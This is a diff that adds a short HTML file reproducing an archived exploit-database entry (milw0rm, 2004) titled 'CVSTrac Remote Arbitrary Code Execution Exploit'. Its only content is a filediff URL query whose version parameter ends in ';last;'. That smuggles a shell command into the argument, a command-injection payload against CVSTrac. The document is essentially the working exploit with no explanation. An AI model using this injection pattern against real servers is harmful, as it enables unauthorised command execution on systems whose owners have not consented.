@@ -1,0 +1,10 @@
+<html>
+<head>
+<title>CVSTrac Remote Arbitrary Code Execution Exploit</title>
+<pre>
+filediff?f=CVSROOT/rcsinfo&amp;v1=1.1&amp;v2=1.2;last;
+
+# milw0rm.com [2004-08-06]
+</pre>
+</html>
+
